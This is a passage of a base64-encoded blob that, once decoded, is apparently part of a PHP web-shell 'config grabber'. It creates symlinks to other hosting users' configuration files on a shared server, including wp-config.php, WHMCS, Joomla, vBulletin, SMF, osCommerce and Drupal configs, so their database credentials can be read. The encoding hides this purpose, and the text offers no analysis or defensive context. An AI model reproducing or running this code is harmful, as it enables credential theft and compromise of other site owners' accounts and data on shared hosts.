Glvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3AtWkNzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2h